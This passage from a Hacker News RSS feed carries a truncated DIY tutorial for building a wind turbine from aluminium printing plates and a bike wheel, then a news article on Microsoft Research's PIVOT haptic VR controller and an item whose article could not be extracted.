            <td><p><strong>Sticky Tape</strong></p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/peg1.jpg" alt="" width="80" height="80"></td>
            <td><strong>4 Clothes Pegs</strong><br>
              Springy or the other kind.</td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/printer1.jpg" alt="" width="80" height="80"></td>
            <td><strong>Computer and printer</strong><br>
Low quality black and  white is fine.<br>
And 2 pieces of A4 or US Letter paper.</td>
          </tr>
          <tr>
            <td>              <p><strong>Optional:</strong></p></td>
            <td>&nbsp;</td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/7mmsocket1.jpg" alt="" width="80" height="80"></td>
            <td>
              
              
              <p><strong>7mm Socket / Nut Driver<br>
              </strong>For use with the drill to tighten your  bolts. Much faster and easier.</p></td>
          </tr>
        </tbody></table>
        <p><a name="mat" id="mat"></a><strong>Materials:</strong></p>
<table>
          <tbody><tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/aluplate1.jpg" width="80" height="80"></td>
            <td><strong>11 Aluminium lithographic offset printing plates<br>
            </strong>These are pure aluminium sheets used in a printing process fairly common with newspapers and packaging. A medium sized printing company may recycle hundreds of plates every week, so it's usually easy to pick them up cheap. Ring around any local companies offering offset printing.<br>
Any size, thickness, or type is fine as long as they're larger than 67cm on the long axis.
              They'll probably be quite inky when you get them, it washes off your hands easily enough with soap and should be non toxic.</td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/rivet1.jpg" width="80" height="80"></td>
            <td>
              <p><strong>150</strong><strong> 4mm </strong><strong>D</strong><strong>iameter </strong><strong>P</strong><strong>op </strong><strong>R</strong><strong>ivets</strong> <br>
              About 6-8mm  long. </p>
              </td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/m4bolt1.jpg" width="80" height="80"></td>
            <td><p><strong>1</strong><strong>8</strong><strong> M4 </strong><strong>B</strong><strong>olts / </strong><strong>Machine  Screws<br>
            </strong>About 12-20mm long, hex heads are best.</p>
              </td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/nylock1.jpg" width="80" height="80"></td>
            <td>
              <p><strong>1</strong><strong>8</strong><strong> M4 </strong><strong>N</strong><strong>yl</strong><strong><strong>ocs</strong></strong><strong> / </strong><strong>Lock Nuts<br>
  </strong>These are nuts with a ring of nylon to  stop them rattling loose. If you can't find these a normal M4 nut  with a spring washer will do the same job.</p>
</td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/washer2.jpg" alt="" width="80" height="80"></td>
            <td><strong>24 Small Washers  <br>
            </strong>            4mm inner diameter to fit the pop rivets and bolts, outer diameter about 10mm.<br>            </td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/pennywasher1.jpg" alt="" width="80" height="80"></td>
            <td>
              <p><strong>27 Large/Penny/Repair </strong><strong>W</strong><strong>ashers</strong> <br>
      4mm inner  diameter to fit the pop rivets and bolts, outer diameter about 20mm.</p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/bikewheel1.jpg" width="80" height="80"></td>
            <td><p><strong>26 Inch </strong><strong>B</strong><strong>ike </strong><strong>W</strong><strong>heel<br>
              </strong>Exactly how  bike wheels are measured is slightly complicated, basically you want  one which is about 58cm total outer rim diameter, give or take. <br>
              The  wheel should:<br>
              ~ Not be quick release <br>
              ~ Have a normal thick  axle (about 10mm diameter)<br>
              ~ Have 36 spokes<br>
              ~ Run reasonably  smoothly <br>
              ~ Have enough axle showing to attach to your pole  mount, at least 3-4cm.<br>
            ~ Only needs gears if you're going to be running a chain off them, which you probably aren't.</p>              <p>It may be helpful to take the wheel  hub apart using spanners and a bike cone spanner and give the  bearings a bit of a clean and re-grease, and to extend the axle as  much as possible on one side for attaching. If you've not done this  before take it along to your local bike servicing place and they'll  be happy to show you how. Shouldn't be necessary tho if the wheel  runs nicely enough and has enough axle showing.</p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/spokes1.jpg" width="80" height="80"></td>
            <td><strong>12 bike wheel spokes</strong>
            <p>Any length, type, or condition is fine.</p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/flatsteel1.jpg" width="80" height="80"></td>
            <td>
              <p><strong>2 </strong><strong>S</strong><strong>trips of </strong><strong>S</strong><strong>teel</strong><br>
      Roughly 20cm x 3cm x 3mm.</p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/bikeaxle1.jpg" width="80" height="80"></td>
            <td>
              <p><strong>Spare B</strong><strong>ike Wheel Axle and  Three Nuts To Fit</strong><br>
      Anything as long as it's the same thread  as the axle on your wheel.</p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/m6bolt1.jpg" width="80" height="80"></td>
            <td><p><strong>3 M6 x About 60mm Bolts and Nuts<br>
            </strong><span>You'll  want them with small hex heads.</span></p>
              </td>
          </tr>
        </tbody></table>
<h3><a name="resources" id="steps2"></a>Resources:</h3>

<p><a name="steps" id="steps"></a>
<strong>Step by step build instructions:</strong></p>
<p>These relate to the animation to the left. </p>
<p><strong>Step 1:</strong><br>
  Download and print the two template  files from the links above. Make sure they're printed at 100% (200  dpi). When printed measure the distance between the dimension arrows,  it should be 10cm on both pages. If it's a couple mm off that's  probably ok.</p>
<p>Tape the pages together so that the 10cm dimension marks overlap  as closely as possible. Best way to do this is on a window pane  during the day, so you can see both pages showing through.<br>
  With  a craft knife and the angle aluminium as a straight edge, cut out the  outer border of the template.<br>
  Any time you're cutting, always  make sure your other hand is never in front of the knife, so if you  slip you're not going to slice yourself. The angle aluminium is good  for this, as the vertical bit effectively shields the hand holding  it.</p>
<p><strong>2</strong><strong>:</strong><br>
  Take an aluminium sheet  and measure a box 42cm x 48cm. Draw a line half way up the 48cm  length so you have two boxes measuring 42cm x 24cm. Score the outer  lines with the Stanley knife and straight edge. You're not trying to  cut through the metal, just create a line that can then be popped out  later. A good method is to score once lightly, then a second time a  bit deeper.<br>
  Do not score the 24cm halfway line.</p>
<p>Flex the metal so that it bends at a score line, then flex back  the other way. Do this a couple times and it should split. Do the  same for the other score and remove the outer metal. Keep it for  later. </p>
<p><strong>3</strong><strong>:</strong><br>
  Tape the template to the  metal rectangle (from now on to be referred to as a 'former') so that  the long edge of the paper sits on the middle line and the right hand  edges of both line up. Don't worry if the other edges don't align  perfectly.</p>
<p>With blade and straight edge, score out the template curve,  including the triangles at each end. It's not essential that this be  100% perfect, but try to get the first one reasonably nice as you can  then use it as a template for the rest.</p>
<p>Score, flex, and remove the two triangles of metal outside the  template.</p>
<p><strong>4</strong><strong>:</strong><br>
  Mark the centers of the  little circles on the paper template with a marker pen so that  they're visible from the other side and flip the paper over so that  the printed side is down on the other half of the former, keeping the  long edge on the middle line. Retape so it doesn't shift.<br>
  Give  the curved score a couple of flexes and tear it out. Remove the two  small triangles. Be careful not to bend the unscored metal too much  as you're doing this as it may weaken it.</p>
<p>You now have your first former. Repeat steps 2 through 3 so that  you have a total of 6 formers. You can use the first former as a  cutting template rather than the paper. On three of the formers have  the 24cm line drawn on the front, the other three on the back.</p>
<p><strong>5</strong><strong>:</strong><br>
  Take all six formers and peg them together  so that they are as nicely aligned as possible.<br>
  Use tape to  attach them if you don't have clothes pegs. </p>
<p>Drill each of the 16 holes through all six formers with a 4mm bit.  Drill the center hole first, as this is the only one that needs to be  reasonably accurate. It can help to put a bolt through that first  hole to keep the formers from shifting around as you drill.</p>
<p>If the holes on your template are laid out a little differently  than those in the animation it'll be because the template is more  up to date.</p>
<p>Remove the template and unpeg the formers.<br>
  Place a former  with the 24cm line slightly overhanging the edge of the table. Place  the straight edge on the middle line and bend up to 90 degrees.  Repeat with all six, with three formers bent shiny side up and three  bent shiny side down. <br>
  Put the formers aside. </p>
<p><strong>6</strong><strong>:</strong><br>
  Take an aluminium sheet  and flatten out any bends in the metal. Cut the long edge down to  67cm.</p>
<p>Draw a line 2cm from one of the 67cm edges, flip the sheet over  and draw another line 2cm from the opposite edge on the other side of  the metal.</p>
<p>repeat with 2 more sheets and peg all 3 together so that each  drawn line is aligned to the edge of the sheet above it.</p>
<p>Mark the edge at 4cm, 6, 8, 10, 18, 26, 34, and then every 2cm up  to and including 64cm<br>
  Keep in mind that one side has a score at  4cm from the edge, the other at 3cm.</p>
<p>Flip the sheets over, making sure they don't lose their alignment.  Mark and score the same as the first edge. Make sure both have the  4cm gap on the same edge.</p>
<p><strong>7</strong><strong>:</strong><br>
  Tap the sheets on the  table so that they are aligned on top of each other.<br>
  From the  4cm end draw a vertical line at 19cm from the edge, and one at 33cm  from the edge.<br>
  Mark each line at 3cm and 20cm from both ends.</p>
<p>Drill all 3 sheets with 4mm holes at all 8 marks. If you're  making a six vane turbine rather than three you can drill all six  sheets at once as easily.<br>
  Unpeg the sheets.</p>
<p><strong>8:</strong><br>
  Place a sheet so that the second 3cm edge is  overhanging the table. Place the straight edge on …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://opensourcelowtech.org/wind_turbine.html">http://opensourcelowtech.org/wind_turbine.html</a></em></p>]]>
            </description>
            <link>http://opensourcelowtech.org/wind_turbine.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24865731</guid>
            <pubDate>Fri, 23 Oct 2020 03:17:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Microsoft Research presents PIVOT, placing VR objects into your hand]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24865195">thread link</a>) | @vrfinal
<br/>
October 22, 2020 | https://www.vrfinal.com/microsoft-research-pivot-haptic-vr-handhelds/ | <a href="https://web.archive.org/web/*/https://www.vrfinal.com/microsoft-research-pivot-haptic-vr-handhelds/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <figure><iframe width="612" height="344" src="https://www.youtube.com/embed/kj3RdeJUJos?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><figcaption>It does look a bit sinister when you're using it to grab rabbits, though.</figcaption></figure><p>We've had a summer of fantastic new haptic VR controller designs.</p><p>From <a href="https://www.vrfinal.com/new-vr-controller-a-game-changer-in-immersive-combat/">Tactical Haptics' game-changing VR sabre</a> to <a href="https://www.vrfinal.com/sony-patent-hints-at-next-gen-psvr-controllers/">Sony's latest PS VR patents</a>, developers are hard at work realising fantasy and making VR more immersive than ever.</p><p>This week, Microsoft announced Haptic PIVOT, the latest in a long line of haptic VR controllers developed by the company's Research wing. The project's ambition is simple: to move us towards a VR experience in which "feelings will be on par with the awe-inspiring and realistic renderings being produced today by head-mounted displays."</p><figure><img src="https://www.vrfinal.com/content/images/2020/10/Haptic-Pivot-Figure-2-1024x268.jpg" alt="" srcset="https://www.vrfinal.com/content/images/size/w600/2020/10/Haptic-Pivot-Figure-2-1024x268.jpg 600w, https://www.vrfinal.com/content/images/size/w1000/2020/10/Haptic-Pivot-Figure-2-1024x268.jpg 1000w, https://www.vrfinal.com/content/images/2020/10/Haptic-Pivot-Figure-2-1024x268.jpg 1024w" sizes="(min-width: 720px) 720px"><figcaption>PIVOT mounts on your wrist and only comes out when it's required. (Credit: Microsoft Research)</figcaption></figure><p><a href="https://www.microsoft.com/en-us/research/blog/physics-matters-haptic-pivot-an-on-demand-controller-simulates-physical-forces-such-as-momentum-and-gravity/">In a statement released by the company</a>, Microsoft Researched explained the thinking behind their latest device:</p><blockquote>When you reach out an empty hand to pick an apple from a tree, you’re met with a variety of sensations—the firmness of the apple as you grip it, the resistance from the branch as you tug the apple free, the weight of the apple in your palm once you’ve plucked it, and the smooth, round surface under your fingertips.</blockquote><p>"If Sir Isaac Newton were to have found the inspiration for his laws of motion and gravity from a <em>virtual </em>apple falling from a <em>virtual</em> tree," the statement continues, "he would have needed a controller like PIVOT."</p><figure><img src="https://www.vrfinal.com/content/images/2020/10/Haptic-Pivot-_figure1-1.png" alt="" srcset="https://www.vrfinal.com/content/images/size/w600/2020/10/Haptic-Pivot-_figure1-1.png 600w, https://www.vrfinal.com/content/images/2020/10/Haptic-Pivot-_figure1-1.png 627w"><figcaption>The haptic device uses a retractable handle to replicate the real life physics of interacting with objects. (Credit: Microsoft Research)</figcaption></figure><p>PIVOT is quite simple. When a user approaches an interactable object in VR, the robotised haptic handle deploys toward the user's palm.</p><p>It is a wrist mounted haptic device which - by rendering the "momentum and drag of thrown and caught objects" - is able to convincingly emulate the sensation of interacting with real physical objects. This means PIVOT goes far further than allowing users to grasp objects, but also drop, throw and catch them, too.</p><figure><img src="https://www.vrfinal.com/content/images/2020/10/Pivot-GIF-1.gif" alt=""><figcaption>(Credit: Microsoft Research)</figcaption></figure><p>The tech inside the device is so efficient that the handle can go from grasp to fully retracted (at approximately 190 degrees) in just 340 milliseconds. In other words, the time it takes to blink an eye.</p><p>We already knew that the convincing emulation of touch could be the final challenge before developers can offer <em>fully immersive</em> virtual reality experiences. Microsoft Research's PIVOT could be a big step towards that.</p><p>And if you think this is awesome, wait until you see what Facebook is cooking up - <em><a href="https://www.vrfinal.com/facebook-develops-new-hand-tracking-software-to-type-in-vr-without-a-keyboard/">VR keyboard control simply by tracking your hands</a></em>.</p>
          </div></div>]]>
            </description>
            <link>https://www.vrfinal.com/microsoft-research-pivot-haptic-vr-handhelds/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24865195</guid>
            <pubDate>Fri, 23 Oct 2020 01:31:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[U.S. faculty job market tanks]]>
            </title>
            <description>
<![CDATA[
Score 255 | Comments 258 (<a href="https://news.ycombinator.com/item?id=24864838">thread link</a>) | @SQL2219
<br/>
October 22, 2020 | https://sci-hub.st/10.1126/science.370.6514.272 | <a href="https://web.archive.org/web/*/https://sci-hub.st/10.1126/science.370.6514.272">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://sci-hub.st/10.1126/science.370.6514.272</link>
            <guid isPermaLink="false">hacker-news-small-sites-24864838</guid>
            <pubDate>Fri, 23 Oct 2020 00:20:10 GMT</pubDate>
        </item>
    </channel>
</rss>
